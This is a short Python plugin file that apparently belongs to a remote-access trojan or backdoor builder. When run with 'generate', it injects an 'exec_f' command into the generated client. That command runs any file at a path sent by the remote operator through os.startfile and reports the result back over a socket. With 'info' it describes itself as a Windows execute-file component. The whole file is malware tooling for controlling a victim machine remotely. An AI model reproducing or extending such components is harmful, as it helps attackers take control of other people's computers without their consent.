# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from os import startfile')
        self.config.functions.append('''
def exec_f(file):
    startfile(file.split(' ',1)[1])
    send_all(s,'[+]Executed : ' + file.split(' ',1)[1])''')
        self.config.logics.append('''
            elif command == "exec_f":
                exec_f(data)''')
        self.config.help_menu['exec_f <Remote file path>'] = 'Will open and execute any file that is specified as the argument'
    elif option == 'info':
        self.log.blank('\nName             : Execute file component' \
                      '\nOS               : Windows' \
                      '\nRequired Modules : os' \
                      '\nCommands         : exec_f <Remote file path>' \
                      '\nDescription      : Will open and execute any file that is specified as the argument\n')
        return {
                "Name": "Execute file component",
                "OS": "Windows",
                "Required Modules": "os",
                "Commands": "exec_f <Remote file path>",
                "Description": "Will open and execute any file that is specified as the argument"}
